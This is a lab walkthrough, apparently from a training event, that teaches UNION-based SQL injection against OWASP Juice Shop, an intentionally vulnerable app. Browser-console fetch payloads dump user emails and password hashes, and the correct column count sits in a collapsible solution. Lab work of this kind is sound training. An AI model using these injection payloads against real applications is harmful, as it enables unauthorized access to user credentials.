## Instructions:

### Use UNION to gain access to data
1. The authentication just sends our raw input into the SQL query, so it's possible that the search does as well.
2. Open Developer Tools and navigate to the `Network` tab.
    1. (Ctrl + shift + i) or (Right click -> Inspect).
3. In OWASP Juice Shop, search for `Banana`.
4. Select the `search?q=` entry and navigate to the `Preview` and `Reponse` tab.
    1. It looks like it is likely doing a `SELECT * FROM ...` We can modify this with UNION to add a *different* table to the results.
5. Enter the following into the Console tab of your Developer Tools
``` 
fetch("/rest/products/search?q=qwe')) UNION SELECT id, email, password, '4', '5', '6', '7' FROM Users--")
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error(error));
```
6. Navigate to the Network tab, select the errored search, and go to the Response tab.
    1. You should see `Error: SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result column`. This is because we need the *correct* number of columns in our query. Go ahead and try and see how many columns there are. **You'll know when it's correct.**
7. 
    <details>
    <summary><strong>Click here to view the solution.</strong></summary>

    ```
    fetch("/rest/products/search?q=qwe')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--")
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error(error));
    ```
    </details>
8. With that, you get a list of the usernames and **MD5 hashes** of their passwords.
    1. See some of the other hacking labs here at ZTW26 for cracking these!
    2. UNION-based SQLi attacks have been quite successful, such as the [2012 Yahoo Voices hack](https://en.wikipedia.org/wiki/2012_Yahoo_Voices_hack) where ~450,000 usernames and passwords were stolen with this technique.

## Relevant CVEs:
1. [CVE-2025-59816](https://nvd.nist.gov/vuln/detail/CVE-2025-59816): **CVSS 7.3**
    1. Data exposure.
2. [CVE-2024-1512](https://nvd.nist.gov/vuln/detail/CVE-2024-1512): **CVSS 9.8**
    1. Data exposure.
3. [CVE-2023-39344](https://nvd.nist.gov/vuln/detail/CVE-2023-39344): **CVSS 10.0**
    1. Full remote code execution.
